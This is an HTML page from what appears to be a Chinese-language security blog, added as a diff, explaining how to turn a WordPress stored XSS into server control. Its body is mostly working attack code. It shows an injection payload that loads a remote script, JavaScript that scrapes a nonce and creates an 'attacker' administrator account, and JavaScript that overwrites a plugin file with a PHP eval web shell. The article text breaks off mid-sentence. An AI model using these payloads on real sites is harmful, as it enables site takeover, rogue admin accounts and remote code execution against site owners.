@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="（从xss到getshell） xss的深层次利用与探讨今天我们的网站上公布了大量的wp的xss，那么这篇文章就是深入探讨如何深入利用xss。 如果师傅们有什么新的思路或者姿势。可以通过邮箱联系我们进行讨论与交流 联系邮箱：ian@lcx.cc 通过js文件添加wp系统管理员1、创建管理账号举个例子，攻击者可以在其Web服务器上托管JavaScript文件，例如wpaddadmin[.]js（在链">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88%E4%BB%8Exss%E5%88%B0getshell%EF%BC%89%20xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="（从xss到getshell） xss的深层次利用与探讨今天我们的网站上公布了大量的wp的xss，那么这篇文章就是深入探讨如何深入利用xss。 如果师傅们有什么新的思路或者姿势。可以通过邮箱联系我们进行讨论与交流 联系邮箱：ian@lcx.cc 通过js文件添加wp系统管理员1、创建管理账号举个例子，攻击者可以在其Web服务器上托管JavaScript文件，例如wpaddadmin[.]js（在链">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/(%E4%BB%8Exss%E5%88%B0getshell)xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8/media/rId24.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/(%E4%BB%8Exss%E5%88%B0getshell)xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8/media/rId26.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/(%E4%BB%8Exss%E5%88%B0getshell)xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8/media/rId28.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/(%E4%BB%8Exss%E5%88%B0getshell)xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8/media/rId29.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/(%E4%BB%8Exss%E5%88%B0getshell)xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8/media/rId30.png">
+<meta property="article:published_time" content="2022-07-08T06:26:07.710Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.401Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/(%E4%BB%8Exss%E5%88%B0getshell)xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8/media/rId24.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Wordpress/Wordpress 系统漏洞/（从xss到getshell） xss的深层次利用与探讨" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88%E4%BB%8Exss%E5%88%B0getshell%EF%BC%89%20xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8/" class="article-date">
+  <time datetime="2022-07-08T06:26:07.710Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（从xss到getshell）-xss的深层次利用与探讨"><a href="#（从xss到getshell）-xss的深层次利用与探讨" class="headerlink" title="（从xss到getshell） xss的深层次利用与探讨"></a>（从xss到getshell） xss的深层次利用与探讨</h1><p>今天我们的网站上公布了大量的wp的xss，那么这篇文章就是深入探讨如何深入利用xss。</p>
+<p>如果师傅们有什么新的思路或者姿势。可以通过邮箱联系我们进行讨论与交流</p>
+<p>联系邮箱：ian@lcx.cc</p>
+<h2 id="通过js文件添加wp系统管理员"><a href="#通过js文件添加wp系统管理员" class="headerlink" title="通过js文件添加wp系统管理员"></a>通过js文件添加wp系统管理员</h2><h3 id="1、创建管理账号"><a href="#1、创建管理账号" class="headerlink" title="1、创建管理账号"></a>1、创建管理账号</h3><p>举个例子，攻击者可以在其Web服务器上托管JavaScript文件，例如wpaddadmin<br>[.]<br>js（在链接中描述）。此JavaScript代码将添加一个WordPress管理员帐户，其用户名为”<br>attacker”，密码为” attacker”。</p>
+<pre><code>// Send a GET request to the URL &#39;/wordpress/wp-admin/user-new.php&#39;, and extract the current &#39;nonce&#39; value  
+var ajaxRequest = new XMLHttpRequest();  
+var requestURL = &quot;/wordpress/wp-admin/user-new.php&quot;;  
+var nonceRegex = /ser&quot; value=&quot;([^&quot;]*?)&quot;/g;  
+ajaxRequest.open(&quot;GET&quot;, requestURL, false);  
+ajaxRequest.send();  
+var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);  
+var nonce = nonceMatch[1];  
+
+// Construct a POST query, using the previously extracted &#39;nonce&#39; value, and create a new user with an arbitrary username / password, as an Administrator  
+var params = &quot;action=createuser&amp;_wpnonce_create-user=&quot;+nonce+&quot;&amp;user_login=attacker&amp;email=attacker@site.com&amp;pass1=attacker&amp;pass2=attacker&amp;role=administrator&quot;;  
+ajaxRequest = new XMLHttpRequest();  
+ajaxRequest.open(&quot;POST&quot;, requestURL, true);  
+ajaxRequest.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);  
+ajaxRequest.send(params);
+</code></pre>
+<p>然后，攻击者可以使用以下PoC插入JavaScript。</p>
+<pre><code>“&quot;&amp;gt;&amp;lt;img src=1 onerror=&quot;javascript&amp;colon;(function () &#123; var url = &#39;http://aaa.bbb.ccc.ddd/ wpaddadmin.js&#39;;if (typeof beef == &#39;undefined&#39;) &#123; var bf = document.createElement(&#39;script&#39;); bf.type = &#39;text/javascript&#39;; bf.src = url; document.body.appendChild(bf);&#125;&#125;)();&quot;&amp;gt;”
+</code></pre>
+<h3 id="图1-插入XSS代码以添加管理员帐户"><a href="#图1-插入XSS代码以添加管理员帐户" class="headerlink" title="图1.插入XSS代码以添加管理员帐户"></a>图1.插入XSS代码以添加管理员帐户</h3><p><img src="/resource/(%E4%BB%8Exss%E5%88%B0getshell)xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8/media/rId24.png"></p>
+<p>具有高权限的受害者查看此帖子后，将创建管理员帐户”攻击者”。</p>
+<h3 id="图2-XSS代码被执行"><a href="#图2-XSS代码被执行" class="headerlink" title="图2. XSS代码被执行"></a>图2. XSS代码被执行</h3><p><img src="/resource/(%E4%BB%8Exss%E5%88%B0getshell)xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8/media/rId26.png"></p>
+<h3 id="图3-XSS代码创建的具有管理员权限的”攻击者”帐户"><a href="#图3-XSS代码创建的具有管理员权限的”攻击者”帐户" class="headerlink" title="图3. XSS代码创建的具有管理员权限的”攻击者”帐户"></a>图3. XSS代码创建的具有管理员权限的”攻击者”帐户</h3><p><img src="/resource/(%E4%BB%8Exss%E5%88%B0getshell)xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8/media/rId28.png"></p>
+<p>然后，攻击者可以将现有的php文件修改为Webshel​​l，并使用该Webshel​​l来控制Web服务器。</p>
+<p>图4.使用攻击者的帐户添加一个Web Shell</p>
+<p><img src="/resource/(%E4%BB%8Exss%E5%88%B0getshell)xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8/media/rId29.png"></p>
+<p>图5.控制Web服务器</p>
+<p><img src="/resource/(%E4%BB%8Exss%E5%88%B0getshell)xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8/media/rId30.png"></p>
+<h3 id="2、恶意命令执行"><a href="#2、恶意命令执行" class="headerlink" title="2、恶意命令执行"></a>2、恶意命令执行</h3><pre><code>// Send a GET request to the URL &#39;/wp-admin/plugin-editor.php?akisment/index.php&#39;, and extract the current &#39;nonce&#39; value
+var ajaxRequest = new XMLHttpRequest();
+var requestURL = &quot;/wp-admin/plugin-editor.php?file=akismet/index.php&quot;
+var nonceRegex = /ce&quot; value=&quot;([^&quot;]*?)&quot;/g;
+ajaxRequest.open(&quot;GET&quot;, requestURL, false);
+ajaxRequest.send();
+var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
+var nonce = nonceMatch[1];
+
+// Construct a POST query, using the previously extracted &#39;nonce&#39; value, and update the content of the file &#39;akismet/index.php&#39; with our tiny web shell
+var params = &quot;_wpnonce=&quot;+nonce+&quot;&amp;newcontent=&lt;?php eval(base64_decode($_REQUEST[&#39;x&#39;]));&amp;action=update&amp;file=akismet/index.php&quot;
+ajaxRequest = new XMLHttpRequest();
+ajaxRequest.open(&quot;POST&quot;, requestURL, true);
+ajaxRequest.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
+ajaxRequest.send(params);
+</code></pre>
+<p>一旦此XSS被管理用户触发，我们应该能够通过向脚本</p>
+<p><a target="_blank" rel="noopener" href="http://0-sec.org/wp-content/plugins/akismet/index.php">http://0-sec.org/wp-content/plugins/akismet/index.php</a></p>
+<p>发送GET / POST请求来执行任意PHP代码，其中参数” x”等于我们的PHP代码的”<br>base6</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88%E4%BB%8Exss%E5%88%B0getshell%EF%BC%89%20xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8/" data-id="cl5c2qygw00mdy8v1a68oeenp" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/WPS/WPS%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2020-4046%EF%BC%89WordPress%20%205.3.4%20%E5%82%A8%E5%9E%8BXSS/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
